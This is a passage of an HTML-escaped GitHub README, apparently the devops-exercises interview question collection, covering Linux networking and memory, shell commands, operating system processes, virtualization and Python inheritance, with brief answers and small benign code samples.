Networking&lt;/h5&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;When you run &lt;code&gt;ip a&lt;/code&gt; you see there is a device called &#39;lo&#39;. What is it and why do we need it?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What the &lt;code&gt;traceroute&lt;/code&gt; command does? How does it works?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Another common way to task this questions is &#34;what part of the tcp header does traceroute modify?&#34; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is network bonding? What types are you familiar with?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to link two separate network namespaces so you can ping an interface on one namespace from the second one?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What are cgroups?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain Process Descriptor and Task Structure&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What are the differences between threads and processes?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain Kernel Threads&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What happens when socket system call is used?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;This is a good article about the topic: &lt;a href=&#34;https://ops.tips/blog/how-linux-creates-sockets&#34;&gt;https://ops.tips/blog/how-linux-creates-sockets&lt;/a&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;You executed a script and while still running, it got accidentally removed. Is it possible to restore the script while it&#39;s still running?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;h4&gt;Linux Memory&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the difference between MemFree and MemAvailable in /proc/meminfo?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;MemFree - The amount of unused physical RAM in your system MemAvailable - The amount of available memory for new workloads (without pushing system to use swap) based on MemFree, Active(file), Inactive(file), and SReclaimable. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the difference between paging and swapping?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain what is OOM killer&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;h4&gt;Distribution&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is a Linux distribution?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What Linux distributions are you familiar with?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What are the components of a Linux distribution?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Kernel&lt;/li&gt; &lt;li&gt;Utilities&lt;/li&gt; &lt;li&gt;Services&lt;/li&gt; &lt;li&gt;Software/Packages Management &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;h4&gt;Linux - Sed&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Using sed, extract the date from the following line: &lt;code&gt;201.7.19.90 - - [05/Jun/1985:13:42:99 +0000] &#34;GET /site HTTP/1.1&#34; 200 32421&lt;/code&gt;&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;code&gt;echo $line | sed &#39;s/.*\[//g;s/].*//g;s/:.*//g&#39;&lt;/code&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;h4&gt;Linux - Misc&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to generate a random string?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;One way is to run the following: &lt;code&gt;cat /proc/sys/kernel/random/uuid&lt;/code&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is a Linux distribution?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;A collection of packages - kernel, GNU, third party apps, ...&lt;/li&gt; &lt;li&gt;Sometimes distributions store some information on the distribution in &lt;code&gt;/etc/*-release&lt;/code&gt; file &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;For example for Red Hat distribution it will be &lt;code&gt;/etc/redhat-release&lt;/code&gt; and for Amazon it will be &lt;code&gt;/etc/os-release&lt;/code&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;code&gt;lsb_release&lt;/code&gt; is a common command you can use in multiple different distributions &lt;/li&gt;&#xA;    &lt;/ul&gt;&lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;    &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Name 5 commands which are two letters long&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;ls, wc, dd, df, du, ps, ip, cp, cd ... &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What ways are there for creating a new empty file?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;touch new_file&lt;/li&gt; &lt;li&gt;echo &#34;&#34; &amp;gt; new_file &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How `cd -` works? How does it knows the previous location?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;$OLDPWD &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;List three ways to print all the files in the current directory&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;ls&lt;/li&gt; &lt;li&gt;find .&lt;/li&gt; &lt;li&gt;echo * &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to count the number of lines in a file? What about words?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;You define x=2 in /etc/bashrc and x=6 ~/.bashrc you then login to the system. What would be the value of x?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the difference between man and info?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;A good answer can be found &lt;a href=&#34;https://askubuntu.com/questions/9325/what-is-the-difference-between-man-and-info-documentation&#34;&gt;here&lt;/a&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain &#34;environment variables&#34;. How do you list all environment variables?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is a TTY device?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to create your own environment variables?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;code&gt;X=2&lt;/code&gt; for example. But this will persist to new shells. To have it in new shells as well, use &lt;code&gt;export X=2&lt;/code&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What a double dash (--) mean?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;It&#39;s used in commands to mark the end of commands options. One common example is when used with git to discard local changes: &lt;code&gt;git checkout -- some_file&lt;/code&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Wildcards are implemented on user or kernel space?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;If I plug a new device into a Linux machine, where on the system, a new device entry/file will be created?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;/dev &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Why there are different sections in man? What is the difference between the sections?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is User-mode Linux?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Under which license Linux is distributed? &lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;GPL v2 &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Operating System&lt;/h2&gt; &#xA;&lt;h3&gt;Operating System Exercises&lt;/h3&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Name&lt;/th&gt; &#xA;   &lt;th&gt;Topic&lt;/th&gt; &#xA;   &lt;th&gt;Objective &amp;amp; Instructions&lt;/th&gt; &#xA;   &lt;th&gt;Solution&lt;/th&gt; &#xA;   &lt;th&gt;Comments&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Fork 101&lt;/td&gt; &#xA;   &lt;td&gt;Fork&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/exercises/os/fork_101.md&#34;&gt;Link&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/exercises/os/solutions/fork_101_solution.md&#34;&gt;Link&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Fork 102&lt;/td&gt; &#xA;   &lt;td&gt;Fork&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/exercises/os/fork_102.md&#34;&gt;Link&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/exercises/os/solutions/fork_102_solution.md&#34;&gt;Link&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h3&gt;Operating System - Self Assessment&lt;/h3&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is an operating system?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;From the book &#34;Operating Systems: Three Easy Pieces&#34;:&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&#34;responsible for making it easy to run programs (even allowing you to seemingly run many at the same time), allowing programs to share memory, enabling programs to interact with devices, and other fun stuff like that&#34;. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;h4&gt;Operating System - Process&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Can you explain what is a process?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;A process is a running program. A program is one or more instructions and the program (or process) is executed by the operating system. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;If you had to design an API for processes in an operating system, what would this API look like?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;It would support the following:&lt;/p&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Create - allow to create new processes&lt;/li&gt; &lt;li&gt;Delete - allow to remove/destroy processes&lt;/li&gt; &lt;li&gt;State - allow to check the state of the process, whether it&#39;s running, stopped, waiting, etc.&lt;/li&gt; &lt;li&gt;Stop - allow to stop a running process &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How a process is created?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;The OS is reading program&#39;s code and any additional relevant data&lt;/li&gt; &lt;li&gt;Program&#39;s code is loaded into the memory or more specifically, into the address space of the process.&lt;/li&gt; &lt;li&gt;Memory is allocated for program&#39;s stack (aka run-time stack). The stack also initialized by the OS with data like argv, argc and parameters to main()&lt;/li&gt; &lt;li&gt;Memory is allocated for program&#39;s heap which is required for dynamically allocated data like the data structures linked lists and hash tables&lt;/li&gt; &lt;li&gt;I/O initialization tasks are performed, like in Unix/Linux based systems where each process has 3 file descriptors (input, output and error)&lt;/li&gt; &lt;li&gt;OS is running the program, starting from main() &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;True or False? The loading of the program into the memory is done eagerly (all at once)&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;False. It was true in the past but today&#39;s operating systems perform lazy loading which means only the relevant pieces required for the process to run are loaded first. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What are different states of a process?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Running - it&#39;s executing instructions&lt;/li&gt; &lt;li&gt;Ready - it&#39;s ready to run but for different reasons it&#39;s on hold&lt;/li&gt; &lt;li&gt;Blocked - it&#39;s waiting for some operation to complete. For example I/O disk request &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What are some reasons for a process to become blocked?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;I/O operations (e.g. Reading from a disk)&lt;/li&gt; &lt;li&gt;Waiting for a packet from a network &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is Inter Process Communication (IPC)?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is &#34;time sharing&#34;?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Even when using a system with one physical CPU, it&#39;s possible to allow multiple users to work on it and run programs. This is possible with time sharing where computing resources are shared in a way it seems to the user the system has multiple CPUs but in fact it&#39;s simply one CPU shared by applying multiprogramming and multi-tasking. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is &#34;space sharing&#34;?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Somewhat the opposite of time sharing. While in time sharing a resource is used for a while by one entity and then the same resource can be used by another resource, in space sharing the space is shared by multiple entities but in a way where it&#39;s not being transferred between them.&lt;br&gt; It&#39;s used by one entity until this entity decides to get rid of it. Take for example storage. In storage, a file is yours until you decide to delete it. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What component determines which process runs at a given moment in time?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;CPU scheduler &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;h4&gt;Operating System - Memory&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is &#34;virtual memory&#34; and what purpose it serves?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is demand paging?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is copy-on-write or shadowing?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is a kernel, and what does it do?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;The kernel is part of the operating system and is responsible for tasks like:&lt;/p&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Allocating memory&lt;/li&gt; &lt;li&gt;Schedule processes&lt;/li&gt; &lt;li&gt;Control CPU &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;True or False? Some pieces of the code in the kernel are loaded into protected areas of the memory so applications can&#39;t overwritten them&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;True &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is POSIX?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain what is Semaphore and what its role in operating systems&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is cache? What is buffer?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Buffer: Reserved place in RAM which is used to hold data for temporary purposes Cache: Cache is usually used when processes reading and writing to the disk to make the process faster by making similar data used by different programs easily accessible. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Virtualization&lt;/h2&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is Virtualization?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Virtualization uses software to create an abstraction layer over computer hardware that allows the hardware elements of a single computer—processors, memory, storage and more - to be divided into multiple virtual computers, commonly called virtual machines (VMs). &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is a hypervisor?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;Red Hat: &#34;A hypervisor is software that creates and runs virtual machines (VMs). A hypervisor, sometimes called a virtual machine monitor (VMM), isolates the hypervisor operating system and resources from the virtual machines and enables the creation and management of those VMs.&#34;&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Read more &lt;a href=&#34;https://www.redhat.com/en/topics/virtualization/what-is-a-hypervisor&#34;&gt;here&lt;/a&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What types of hypervisors are there?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Hosted hypervisors and bare-metal hypervisors. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What are the advantages and disadvantges of bare-metal hypervisor over a hosted hypervisor?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;Due to having its own drivers and a direct access to hardware components, a baremetal hypervisor will often have better performances along with stability and scalability.&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;On the other hand, there will probably be some limitation regarding loading (any) drivers so a hosted hypervisor will usually benefit from having a better hardware compatibility. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What types of virtualization are there?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Operating system virtualization Network functions virtualization Desktop virtualization &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Is containerization is a type of Virtualization?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Yes, it&#39;s a operating-system-level virtualization, where the kernel is shared and allows to use multiple isolated user-spaces instances. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How the introduction of virtual machines changed the industry and the way applications were deployed?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;The introduction of virtual machines allowed companies to deploy multiple business applications on the same hardware while each application is separated from each other in secured way, where each is running on its own separate operating system. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;h4&gt;Python - OOP&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain inheritance and how to use it in Python&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;pre&gt;&lt;code&gt;By definition inheritance is the mechanism where an object acts as a base of another object, retaining all its&#xA;properties.&#xA;&#xA;So if Class B inherits from Class A, every characteristics from class A will be also available in class B.&#xA;Class A would be the &#39;Base class&#39; and B class would be the &#39;derived class&#39;.&#xA;&#xA;This comes handy when you have several classes that share the same functionalities.&#xA;&#xA;The basic syntax is:&#xA;&#xA;class Base: pass&#xA;&#xA;class Derived(Base): pass&#xA;&#xA;A more forged example:&#xA;&#xA;class Animal:&#xA;    def __init__(self):&#xA;        print(&#34;and I&#39;m alive!&#34;)&#xA;&#xA;    def eat(self, food):&#xA;        print(&#34;ñom ñom ñom&#34;, food)&#xA;&#xA;class Human(Animal):&#xA;    def __init__(self, name):&#xA;        print(&#39;My name is &#39;, name)&#xA;        super().__init__()&#xA;&#xA;    def write_poem(self):&#xA;        print(&#39;Foo bar bar foo foo bar!&#39;)&#xA;&#xA;class Dog(Animal):&#xA;    def __init__(self, name):&#xA;        print(&#39;My name is&#39;, name)&#xA;        super().__init__()&#xA;&#xA;    def bark(self):&#xA;        print(&#39;woof woof&#39;)&#xA;&#xA;&#xA;michael = Human(&#39;Michael&#39;)&#xA;michael.eat(&#39;Spam&#39;)&#xA;michael.write_poem()&#xA;&#xA;bruno = Dog(&#39;Bruno&#39;)&#xA;bruno.eat(&#39;bone&#39;)&#xA;bruno.bark()&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; My name is  Michael&#xA;&amp;gt;&amp;gt;&amp;gt; and I&#39;m alive!&#xA;&amp;gt;&amp;gt;&amp;gt; ñom ñom ñom Spam&#xA;&amp;gt;&amp;gt;&amp;gt; Foo bar bar foo foo bar!&#xA;&amp;gt;&amp;gt;&amp;gt; My name is Bruno&#xA;&amp;gt;&amp;gt;&amp;gt; and I&#39;m alive!&#xA;&amp;gt;&amp;gt;&amp;gt; ñom ñom ñom bone&#xA;&amp;gt;&amp;gt;&amp;gt; woof woof&#xA;&#xA;Calling super() calls the Base method, thus, calling super().__init__() we called the Animal __init__.&#xA;&#xA;There is a more advanced python feature called MetaClasses that aid the programmer to directly control class creation.&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain and demonstrate class attributes &amp;amp; instance attributes&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;In the following block of code &lt;code&gt;x&lt;/code&gt; is a class attribute while &lt;code&gt;self.y&lt;/code&gt; is a instance attribute&lt;/p&gt; &lt;pre&gt;&lt;code&gt;class MyClass(object):&#xA;    x = 1&#xA;&#xA;    def __init__(self, y):&#xA;        self.y = y&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;h4&gt;Python - Exceptions&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is an 